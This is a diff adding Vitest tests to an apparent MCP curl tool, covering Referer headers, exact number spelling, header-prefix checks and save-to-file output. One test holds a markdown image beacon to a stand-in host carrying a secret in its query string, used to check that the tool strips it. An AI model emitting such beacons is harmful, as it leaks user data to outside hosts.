@@ -42,9 +42,18 @@ vi.mock("../security/index.js", async () => {
     };
 });
 
+// `platformSupportsHeaderDump` is stubbed as well as `executeCommand`, because
+// the real one is `process.platform === "darwin"`. Left real, the
+// `include_headers` cases below take the `headers_unsupported` branch on every
+// Linux runner — and they would still FAIL there, because `formatResponse`
+// prepends the "cannot be captured on this host" notice and that prefix breaks
+// the JSON parse exactly as a header block does. So the guard has teeth on both
+// platforms; what it loses is its SUBJECT. A case named for the header block
+// that silently exercises the notice prefix instead is a test whose name is a
+// claim it does not check, and the composition fix has two prefixes to survive.
 vi.mock("../execution/index.js", async () => {
     const actual = await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
-    return { ...actual, executeCommand: vi.fn() };
+    return { ...actual, executeCommand: vi.fn(), platformSupportsHeaderDump: () => true };
 });
 
 const executionModule = await import("../execution/index.js");
@@ -77,8 +86,20 @@ function curlOutput(body: string, contentType: string, headerBlock?: string) {
 /** A minimal response-header block, as cURL dumps it. */
 const HEADER_BLOCK = "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n";
 
-/** Pull the JSON body out of a plain-branch response that carries a header prefix. */
+/**
+ * Pull the JSON body out of a plain-branch response that carries a header
+ * prefix — and **assert the prefix is really there first.**
+ *
+ * Without that assertion the extraction happily matches a bare JSON body, so a
+ * case that never composed a header block at all passes on the strength of the
+ * body alone. The prefix is the precondition of what these cases test, so it is
+ * checked rather than assumed: this cannot go vacuous if the capability stub,
+ * the platform, or `formatResponse`'s composition changes underneath it.
+ */
 function bodyAfterHeaders(text: string): unknown {
+    if (!text.startsWith("HTTP/")) {
+        throw new Error(`expected a header prefix before the body, got: ${text.slice(0, 120)}`);
+    }
     const match = text.match(/\{[\s\S]*\}/);
     if (match === null) throw new Error(`no JSON body in response: ${text}`);
     return JSON.parse(match[0]);
@@ -183,6 +204,23 @@ describe("registerAllTools — the shipped binary's registration path", () => {
 
         const args = mockedExecuteCommand.mock.calls[0][1] as string[];
         expect(flagValue(args, "-A")).toBe("sixees-orchestrator/1.0");
+    });
+
+    // The mechanism that reads `MCP_CURL_USER_AGENT` — `applyDefaultHeaders` —
+    // reads `MCP_CURL_REFERER` from the same resolver, and both are documented
+    // in `README.md` as applying to every request. Covering one of two values
+    // of one mechanism is the shape `LESSONS.md` RC-21 named: the assertion set
+    // has to match the registration set, and half of it is a false green for
+    // the other half.
+    it("honours MCP_CURL_REFERER on the shipped path", async () => {
+        vi.stubEnv("MCP_CURL_REFERER", "https://referer.example.test/from-env");
+        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));
+
+        const handlers = registerViaShippedPath();
+        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });
+
+        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
+        expect(args).toContain("Referer: https://referer.example.test/from-env");
     });
 
     it("identifies itself with the default User-Agent when no env override is set", async () => {
@@ -298,7 +336,16 @@ describe("registerAllTools — the shipped binary's registration path", () => {
         // has no fields and cannot be spliced, so this arm must leave it
         // exactly as the origin sent it.
         it("does not rewrite scalar-shaped string values", async () => {
-            const body = '{"version":"1.50","id":"007","flag":"true","neg":"-0.0"}';
+            // `padded` and `trailing` are what give the raw-number guard in
+            // `isCompositeValue` its teeth. A bare `"1.50"` round-trips
+            // identically through the recursion path once numbers keep their
+            // lexemes, so it cannot detect the guard's removal — but
+            // surrounding whitespace is not part of the lexeme, so a leaf that
+            // wrongly recurses comes back trimmed. Measured: `" 123"` becomes
+            // `"123"`.
+            const body =
+                '{"version":"1.50","id":"007","flag":"true","neg":"-0.0",' +
+                '"padded":" 123","trailing":"123 "}';
             mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
 
             const handlers = registerViaShippedPath();
@@ -311,6 +358,8 @@ describe("registerAllTools — the shipped binary's registration path", () => {
                 id: "007",
                 flag: "true",
                 neg: "-0.0",
+                padded: " 123",
+                trailing: "123 ",
             });
         });
 
@@ -449,6 +498,103 @@ describe("registerAllTools — the shipped binary's registration path", () => {
             expect(returned["ok"]).toBe("also kept");
         });
 
+        // ---------------------------------------------------------------
+        // Numbers. The region-wise walk has to parse and re-serialise to know
+        // where one value ends and the next begins, and `JSON.parse` routes
+        // every number through a double — so a 64-bit identifier comes back
+        // rounded and `1e400` comes back `null`. That hands the model a
+        // plausible WRONG value with no signal, which is worse than the field
+        // deletion this walk exists to prevent: a missing field leaves a gap
+        // somebody can notice. `keepNumberLexeme` re-emits the origin's own
+        // text instead.
+        //
+        // Skipped where the host predates `JSON.rawJSON` (Node 21), because
+        // there the fallback is the old rounding behaviour by design — calling
+        // it blind would throw inside the defence and fail open.
+        // ---------------------------------------------------------------
+        const itWithRawJson = it.skipIf(
+            typeof (JSON as { rawJSON?: unknown }).rawJSON !== "function"
+        );
+
+        itWithRawJson("returns large integers exactly as the origin spelled them", async () => {
+            const body = '{"id":9223372036854775807,"big":12345678901234567890}';
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            expect(text).toContain("9223372036854775807");
+            expect(text).toContain("12345678901234567890");
+            expect(text).not.toContain("9223372036854776000");
+        });
+
+        itWithRawJson("does not turn an out-of-range exponent into null", async () => {
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput('{"v":1e400}', "application/json")
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            expect(text).toContain("1e400");
+            expect(text).not.toContain("null");
+        });
+
+        itWithRawJson("preserves number spelling behind a header block", async () => {
+            const body = '{"id":9223372036854775807,"a":"open <!--","b":"keep","c":"close -->"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(body, "application/json", HEADER_BLOCK)
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ include_headers: true, include_metadata: false }),
+                    { sessionId: undefined }
+                )
+            );
+
+            const returned = bodyAfterHeaders(text) as Record<string, unknown>;
+            expect(Object.keys(returned)).toEqual(["id", "a", "b", "c"]);
+            expect(text).toContain("9223372036854775807");
+        });
+
+        itWithRawJson("preserves number spelling inside a nested document leaf", async () => {
+            const nested = '{"id":9223372036854775807,"x":"open <!--","y":"keep","z":"close -->"}';
+            mockedExecuteCommand.mockResolvedValue(
+                curlOutput(JSON.stringify({ outer: nested }), "application/json")
+            );
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            const inner = JSON.parse((JSON.parse(text) as { outer: string }).outer) as object;
+            expect(Object.keys(inner)).toEqual(["id", "x", "y", "z"]);
+            expect(text).toContain("9223372036854775807");
+        });
+
+        // The beacon strip must still fire on a document carrying raw numbers —
+        // the markers must not become a way to skip the defence.
+        itWithRawJson("still strips a beacon in a document carrying raw numbers", async () => {
+            const body = '{"id":9223372036854775807,"n":"![x](https://evil.test/?d=SECRET)"}';
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
+            );
+
+            expect(text).toContain("[image removed]");
+            expect(text).not.toContain("evil.test");
+            expect(text).toContain("9223372036854775807");
+        });
+
         it("keeps a __proto__ field inside a nested document leaf", async () => {
             // Written as literal JSON, never via an object literal: a
             // `__proto__:` key in JS source sets the prototype instead of
@@ -477,6 +623,36 @@ describe("registerAllTools — the shipped binary's registration path", () => {
     // exist in the first place, recreated on the sibling tool by the guard
     // meant to close it. The assertion set must match the registration set.
     // ---------------------------------------------------------------------
+    // ---------------------------------------------------------------------
+    // The premise the save-path skip rests on. `curl-execute.ts` does NOT
+    // defend the body when it was saved, because `formatResponse` returns the
+    // server-authored message and never reads the body on that branch —
+    // defending it would be a full pass over bytes nobody receives, on the one
+    // path that exists to offload large responses.
+    //
+    // That is a claim about `formatResponse`, so it is asserted rather than
+    // assumed: if a future edit ever returns the body on the file branch, the
+    // skip becomes a real hole and this fails. Guarding the premise is the
+    // point — the skip itself has no observable behaviour to test.
+    // ---------------------------------------------------------------------
+    describe("the save path returns the message, not the body", () => {
+        it("does not put body bytes in a saved-to-file response", async () => {
+            const body = '{"secret_marker":"THIS-MUST-NOT-BE-RETURNED"}';
+            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));
+
+            const handlers = registerViaShippedPath();
+            const text = textOf(
+                await handlers.get("curl_execute")!(
+                    params({ save_to_file: true }),
+                    { sessionId: undefined }
+                )
+            );
+
+            expect(text).not.toContain("THIS-MUST-NOT-BE-RETURNED");
+            expect(text).toContain("saved to:");
+        });
+    });
+
     describe("jq_query takes the same wrap", () => {
         let dir: string;
 
